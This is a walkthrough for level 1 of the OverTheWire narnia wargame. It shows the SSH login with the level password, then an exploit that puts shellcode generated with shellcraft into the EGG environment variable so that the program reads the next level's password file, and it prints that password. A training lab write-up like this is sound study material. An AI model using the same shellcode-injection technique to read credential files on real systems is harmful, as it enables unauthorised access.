---
title: narnia 1 walkthrough
description: over the wire narnia 1
layout: libdoc_page
date: 1111-11-11
eleventyNavigation:
    key: narnia-1 OverTheWire CTFs
    parent: OverTheWire CTFs
    title: narnia 1 walkthrough
    order: 30
---
## Description
> correct variable value via writing to another variable

connect
```bash
$ ssh narnia1@narnia.labs.overthewire.org -p 2226
eaa6AjYMBB
```
execute
```bash
$ /narnia/narnia1
Give me something to execute at the env-variable EGG
```

---
## Hint

---

## Progress
Steps
1. set shellcode as the value of env-variable EGG
```bash
$ export EGG=`shellcraft -f r cat /etc/narnia_pass/narnia2`
```
2. execute it
```bash
$ /narnia/narnia1
Trying to execute EGG!
Zzb6MIyceT
Segmentation fault (core dumped)
```

---


## Techniques
- [[shellcode]]

## Tools
